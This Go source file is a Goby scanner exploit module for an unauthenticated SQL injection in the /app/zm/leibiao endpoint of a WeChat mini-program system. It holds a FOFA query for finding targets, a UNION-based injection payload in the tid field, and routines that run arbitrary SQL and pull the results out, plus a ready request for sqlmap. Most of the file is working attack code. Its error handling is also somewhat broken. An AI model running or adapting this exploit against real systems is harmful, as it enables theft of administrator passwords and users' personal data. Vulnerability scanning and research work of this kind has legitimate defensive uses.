package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Knowledge 5i Pure Version Mini Program System /app/zm/leibiao SQL Injection Vulnerability",
    "Description": "<p>There is a SQL injection vulnerability in the /app/zm/leibiao interface of the Knowledge 5i Pure Version Mini Program System. Attackers can exploit this vulnerability to obtain sensitive information from the database, and in high privilege situations, potentially further control the server.</p>",
    "Product": "WeChat-Applet-System",
    "Homepage": "https://mp.weixin.qq.com/cgi-bin/wx",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-11-13",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"域名/skdjfdf\" && body=\"tajs.qq.com\"",
    "GobyQuery": "body=\"域名/skdjfdf\" && body=\"tajs.qq.com\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in the /app/zm/leibiao interface of the Knowledge 5i Pure Version Mini Program System. Unauthenticated remote attackers can exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), and in high privilege situations, write trojans to the server to further gain access to the server system.</p>",
    "Recommendation": "<p>1. Please pay attention to the manufacturer information and update to the latest version in time: <a href=\"https://mp.weixin.qq.com/cgi-bin/wx\">https://mp.weixin.qq.com/cgi-bin/wx</a></p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E5%8F%91%E5%8D%A1%E7%BD%91%E7%B3%BB%E7%BB%9F/%E7%9F%A5%E8%AF%86%E5%90%BE%E7%88%B1%E7%BA%AF%E5%87%80%E7%89%88%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9Fleibiao%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "version()",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "user(),database(),version()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "知识吾爱纯净版小程序系统 /app/zm/leibiao SQL 注入漏洞",
            "Product": "微信小程序系统",
            "Description": "<p>知识吾爱纯净版小程序系统的 /app/zm/leibiao 接口存在SQL注入漏洞，攻击者可以通过该漏洞获取数据库中的敏感信息，甚至在高权限的情况下可能进一步控制服务器。</p>",
            "Recommendation": "<p>1、请关注厂商信息，及时更新到最新版本：<a href=\"https://mp.weixin.qq.com/cgi-bin/wx\">https://mp.weixin.qq.com/cgi-bin/wx</a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;<br></p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>知识吾爱纯净版小程序系统的 /app/zm/leibiao 接口存在SQL注入漏洞，未经身份验证的远程攻击者可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)，甚至在高权限的情况下可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Knowledge 5i Pure Version Mini Program System /app/zm/leibiao SQL Injection Vulnerability",
            "Product": "WeChat-Applet-System",
            "Description": "<p>There is a SQL injection vulnerability in the /app/zm/leibiao interface of the Knowledge 5i Pure Version Mini Program System. Attackers can exploit this vulnerability to obtain sensitive information from the database, and in high privilege situations, potentially further control the server.</p>",
            "Recommendation": "<p>1. Please pay attention to the manufacturer information and update to the latest version in time: <a href=\"https://mp.weixin.qq.com/cgi-bin/wx\">https://mp.weixin.qq.com/cgi-bin/wx</a><br></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;<br></p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the /app/zm/leibiao interface of the Knowledge 5i Pure Version Mini Program System. Unauthenticated remote attackers can exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), and in high privilege situations, write trojans to the server to further gain access to the server system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "EditType": "fast",
    "PocId": "9971"
}`

	setSqlPayloadtXLgfmgedj := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulURL string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		headers := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}

		urlPost := "/app/zm/leibiao"
		rawpayload := fmt.Sprintf("tid=1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71786a7a71,%s,0x717a716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL--", sql)
		//postDate := fmt.Sprintf("tid=%s", url.QueryEscape(rawpayload))
		resp, err = setPostRequest(hostInfo, urlPost, rawpayload, headers)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulURL = "/app/zm/leibiao"

		return resp, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行16位的md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			content := hex.EncodeToString(MD5Hash.Sum(nil))[8:24]

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "MD5(" + MD5ResultStr + ")"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadtXLgfmgedj
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /app/zm/leibiao HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0\nContent-Type: application/x-www-form-urlencoded\n\ntid=11*"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `qxjzq([\s\S]*?)qzqkq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadtXLgfmgedj
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
